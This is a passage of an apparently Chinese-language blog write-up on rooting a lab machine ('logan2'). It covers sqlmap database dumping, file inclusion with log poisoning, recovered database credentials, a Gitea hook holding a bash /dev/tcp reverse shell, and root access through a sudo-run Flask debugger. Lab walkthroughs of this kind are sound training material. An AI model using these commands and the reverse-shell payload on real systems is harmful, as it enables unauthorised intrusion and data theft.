+└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data <span class="pl-s"><span class="pl-pds">'</span>{"user_agent":"1"}<span class="pl-pds">'</span></span> --batch -D logan --tables     
+        ___
+       __H__                                                                                                                         
+ ___ ___[(]_____ ___ ___  {1.9#stable}                                                                                                 
+<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [(]     <span class="pl-k">|</span> .<span class="pl-s"><span class="pl-pds">'</span>| . |                                                                                                            </span>
+<span class="pl-s">|___|_  [<span class="pl-pds">'</span></span>]_<span class="pl-k">|</span>_<span class="pl-k">|</span>_<span class="pl-k">|</span>__,<span class="pl-k">|</span>  _<span class="pl-k">|</span>                                                                                                            
+      <span class="pl-k">|</span>_<span class="pl-k">|</span>V...       <span class="pl-k">|</span>_<span class="pl-k">|</span>   https://sqlmap.org                                                                                         
+
+省略
+[17:26:42] [INFO] adjusting <span class="pl-k">time</span> delay to 1 second due to good response <span class="pl-c1">times</span>
+3
+[17:26:42] [INFO] retrieved: browser
+[17:27:04] [INFO] retrieved: comments
+[17:27:30] [INFO] retrieved: users
+Database: logan
+[3 tables]
++----------+
+<span class="pl-k">|</span> browser  <span class="pl-k">|</span>
+<span class="pl-k">|</span> comments <span class="pl-k">|</span>
+<span class="pl-k">|</span> users    <span class="pl-k">|</span>
++----------+
+
+
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data <span class="pl-s"><span class="pl-pds">'</span>{"user_agent":"1"}<span class="pl-pds">'</span></span> --batch -D logan -T users --dump
+        ___
+       __H__                                                                                                                         
+ ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 
+<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [)]     <span class="pl-k">|</span> .<span class="pl-s"><span class="pl-pds">'</span>| . |                                                                                                            </span>
+<span class="pl-s">|___|_  [(]_|_|_|__,|  _|                                                                                                            </span>
+<span class="pl-s">      |_|V...       |_|   https://sqlmap.org                                                                                         </span>
+<span class="pl-s"></span>
+<span class="pl-s">省略</span>
+<span class="pl-s">Database: logan</span>
+<span class="pl-s">Table: users</span>
+<span class="pl-s">[1 entry]</span>
+<span class="pl-s">+------------------------------+--------+</span>
+<span class="pl-s">| email                        | user   |</span>
+<span class="pl-s">+------------------------------+--------+</span>
+<span class="pl-s">| logan@newsitelogan.logan.hmv | logan  |</span>
+<span class="pl-s">+------------------------------+--------+</span>
+<span class="pl-s"></span></pre></div>
+<p>只有一个用户名和域名，我们将域名加上</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2"><img src="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2" alt="Image" style="max-width: 100%;"></a></p>
+<p>试试有没有文件包含</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea"><img src="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea" alt="Image" style="max-width: 100%;"></a></p>
+<p>存在文件包含，尝试读取密钥，无果。看看存不存在日志注入</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee"><img src="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee" alt="Image" style="max-width: 100%;"></a></p>
+<p>存在，尝试注入</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b"><img src="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b" alt="Image" style="max-width: 100%;"></a></p>
+<p>嘻嘻</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c"><img src="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c" alt="Image" style="max-width: 100%;"></a></p>
+<p>不嘻嘻，容易的都给它禁了</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7"><img src="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7" alt="Image" style="max-width: 100%;"></a></p>
+<p>还一分钟清一次，考验手速是吧？</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a"><img src="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a" alt="Image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd"><img src="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd" alt="Image" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K<span class="pl-pds">'</span></span> <span class="pl-k">|</span>base64 -d
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php
+
+        <span class="pl-smi">$servername</span> = <span class="pl-s"><span class="pl-pds">"</span>localhost<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+        <span class="pl-smi">$username</span> = <span class="pl-s"><span class="pl-pds">"</span>logan<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+        <span class="pl-smi">$password</span> = <span class="pl-s"><span class="pl-pds">"</span>Super_logan1234<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+        <span class="pl-smi">$dbname</span> = <span class="pl-s"><span class="pl-pds">"</span>logan<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+
+        // Create connection
+        <span class="pl-smi">$conn</span> = new mysqli(<span class="pl-smi">$servername</span>, <span class="pl-smi">$username</span>, <span class="pl-smi">$password</span>, <span class="pl-smi">$dbname</span>)<span class="pl-k">;</span>
+        // Check connection
+        <span class="pl-k">if</span> (<span class="pl-smi">$conn</span>-<span class="pl-k">&gt;</span>connect_error) {
+          die(<span class="pl-s"><span class="pl-pds">"</span>Connection failed: <span class="pl-pds">"</span></span> <span class="pl-c1">.</span> <span class="pl-smi">$conn</span>-<span class="pl-k">&gt;</span>connect_error)<span class="pl-k">;</span>
+        }
+
+<span class="pl-k">?</span><span class="pl-k">&gt;</span>
+</pre></div>
+<p>登录Gitea</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c"><img src="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c" alt="Image" style="max-width: 100%;"></a></p>
+<p>改个shell上去</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/sh</span>
+bash -c <span class="pl-s"><span class="pl-pds">"</span>bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1<span class="pl-pds">"</span></span>
+省略</pre></div>
+<p>交个文件上去</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a"><img src="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a" alt="Image" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 55202
+bash: cannot <span class="pl-c1">set</span> terminal process group (428): Inappropriate ioctl <span class="pl-k">for</span> device
+bash: no job control <span class="pl-k">in</span> this shell
+git@logan2:<span class="pl-k">~</span>/gitea-repositories/logan/future_web.git$ id
+id
+uid=104(git) gid=113(git) groups=113(git)</pre></div>
+<h1>3. 获得稳定的 Shell</h1>
+<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<h1>4.提权</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">git@logan2:<span class="pl-k">~</span>/gitea-repositories/logan/future_web.git$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> git on logan2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, use_pty
+
+User git may run the following commands on logan2:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
+git@logan2:<span class="pl-k">~</span>/gitea-repositories/logan/future_web.git$ ls -la /opt/app.py
+ls: cannot access <span class="pl-s"><span class="pl-pds">'</span>/opt/app.py<span class="pl-pds">'</span></span>: Permission denied
+git@logan2:<span class="pl-k">~</span>/gitea-repositories/logan/future_web.git$ <span class="pl-c1">cd</span> /home/
+git@logan2:/home$ ls -al
+total 20
+drwxr-xr-x  5 root  root  4096 Sep 11  2023 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root  root  4096 Aug 27  2023 ..
+drwxr-xr-x  4 git   git   4096 Jan 20 02:58 git
+drwx------  2 kevin kevin 4096 Sep 11  2023 kevin
+drwx------  3 logan logan 4096 Sep 11  2023 logan
+git@logan2:/home$ <span class="pl-c1">cd</span> git/
+git@logan2:<span class="pl-k">~</span>$ ls -al
+total 20
+drwxr-xr-x 4 git  git  4096 Jan 20 02:58 <span class="pl-c1">.</span>
+drwxr-xr-x 5 root root 4096 Sep 11  2023 ..
+-rw-r--r-- 1 git  git   123 Jan 20 02:58 .gitconfig
+drwx------ 2 git  git  4096 Aug 27  2023 .ssh
+drwxr-xr-x 3 git  git  4096 Sep 11  2023 gitea-repositories
+git@logan2:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /tmp/
+git@logan2:/tmp$ ls -al
+total 32
+drwxrwxrwt  8 root root 4096 Jan 20 03:53 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root root 4096 Aug 27  2023 ..
+drwxrwxrwt  2 root root 4096 Jan 20 02:58 .ICE-unix
+drwxrwxrwt  2 root root 4096 Jan 20 02:58 .X11-unix
+drwxrwxrwt  2 root root 4096 Jan 20 02:58 .XIM-unix
+drwxrwxrwt  2 root root 4096 Jan 20 02:58 .font-unix
+drwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-apache2.service-ZTwD9s
+drwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-systemd-logind.service-6lKqu3
+git@logan2:/tmp$ <span class="pl-c1">cd</span> /mnt/
+git@logan2:/mnt$ ls -al
+total 8
+drwxr-xr-x  2 root root 4096 Aug 27  2023 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root root 4096 Aug 27  2023 ..
+git@logan2:/mnt$ <span class="pl-c1">cd</span> /tmp/
+git@logan2:/tmp$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+git@logan2:/tmp$ /sbin/getcap -r / <span class="pl-k">2&gt;</span>/dev/null
+/usr/bin/ping cap_net_raw=ep
+git@logan2:/tmp$ ss -tuln <span class="pl-k">|</span> grep tcp
+tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:<span class="pl-k">*</span>        
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:<span class="pl-k">*</span>        
+tcp   LISTEN 0      128             [::]:22           [::]:<span class="pl-k">*</span>        
+tcp   LISTEN 0      511                <span class="pl-k">*</span>:80              <span class="pl-k">*</span>:<span class="pl-k">*</span>        
+tcp   LISTEN 0      4096               <span class="pl-k">*</span>:3000            <span class="pl-k">*</span>:<span class="pl-k">*</span>        
+git@logan2:/tmp$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> git on logan2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, use_pty
+
+User git may run the following commands on logan2:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
+git@logan2:/tmp$ sudo /usr/bin/python3 /opt/app.py
+ <span class="pl-k">*</span> Serving Flask app <span class="pl-s"><span class="pl-pds">'</span>app<span class="pl-pds">'</span></span>
+ <span class="pl-k">*</span> Debug mode: on
+WARNING: This is a development server. Do not use it <span class="pl-k">in</span> a production deployment. Use a production WSGI server instead.
+ <span class="pl-k">*</span> Running on all addresses (0.0.0.0)
+ <span class="pl-k">*</span> Running on http://127.0.0.1:8000
+ <span class="pl-k">*</span> Running on http://192.168.205.144:8000
+Press CTRL+C to quit
+ <span class="pl-k">*</span> Restarting with stat
+ <span class="pl-k">*</span> Debugger is active<span class="pl-k">!</span>
+ <span class="pl-k">*</span> Debugger PIN: 632-008-714
+</pre></div>
+<p>熟悉的配方，那就简单了（PIN都给了Debugger PIN: 632-008-714）</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9"><img src="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9" alt="Image" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8889                                  
+listening on [any] 8889 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 58630
+root@logan2:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
